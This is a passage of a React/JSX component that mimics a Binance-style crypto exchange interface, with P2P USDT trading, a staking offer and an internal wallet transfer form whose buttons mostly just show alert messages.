                  <button onClick={() => setP2pType('sell')} className={`flex-1 py-1.5 rounded font-bold ${p2pType === 'sell' ? 'bg-red-500 text-white' : 'bg-[#181a20] text-gray-400'}`}>Sell USDT</button>
                </div>
                <div className="bg-[#181a20] p-3 rounded-xl border border-gray-800 space-y-2">
                  <div className="flex justify-between">
                    <span className="font-bold text-white">Merchant: CryptoExpress_VIP</span>
                    <span className="text-[#0ecb81]">100% Completion</span>
                  </div>
                  <div className="text-gray-400 text-[10px]">Price: 1.00 USD | Limit: $10 - $5,000</div>
                  <button onClick={() => alert(`P2P Order initiated successfully!`)} className="w-full bg-[#f0b90b] text-black font-bold p-2 rounded mt-2 cursor-pointer">
                    {p2pType === 'buy' ? 'Buy USDT' : 'Sell USDT'}
                  </button>
                </div>
              </div>
            )}

            {modalType === 'earn' && (
              <div className="space-y-4">
                <h3 className="font-bold text-white text-base">Binance Earn (Staking)</h3>
                <div className="bg-[#181a20] p-3 rounded-xl border border-gray-800 flex justify-between items-center">
                  <div>
                    <div className="font-bold text-white">USDT Flexible Staking</div>
                    <div className="text-[#0ecb81] font-bold">12.5% APR</div>
                  </div>
                  <button onClick={() => alert('Successfully subscribed!')} className="bg-[#f0b90b] text-black font-bold px-3 py-1.5 rounded cursor-pointer">Stake</button>
                </div>
              </div>
            )}

            {modalType === 'transfer' && (
              <div className="space-y-4">
                <h3 className="font-bold text-white text-base">Internal Wallet Transfer</h3>
                <form onSubmit={handleTransferSubmit} className="space-y-3">
                  <div className="flex gap-2">
                    <div className="flex-1">
                      <label className="text-gray-400 block mb-1">From</label>
                      <select value={transferFrom} onChange={(e) => setTransferFrom(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white">
                        <option value="Spot">Spot Wallet</option>
                        <option value="Futures">Futures Wallet</option>
                      </select>
                    </div>
                    <div className="flex-1">
                      <label className="text-gray-400 block mb-1">To</label>
                      <select value={transferTo} onChange={(e) => setTransferTo(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white">
                        <option value="Futures">Futures Wallet</option>
                        <option value="Spot">Spot Wallet</option>
                      </select>
                    </div>
                  </div>
                  <div>
                    <label className="text-gray-400 block mb-1">Coin</label>
                    <select value={transferCoin} onChange={(e) => setTransferCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white">
                      {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
                    </select>
                  </div>
                  <div>
                    <label className="text-gray-400 block mb-1">Amount</label>
                    <input type="number" step="any" placeholder="0.00" value={transferAmount} onChange={(e) => setTransferAmount(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white" />
                  </div>
                  <button type="submit" className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded cursor-pointer">Confirm Transfer</button>
                </form>
              </div>
            )}

          </div>
        </div>
      )}

    </div>
  );
}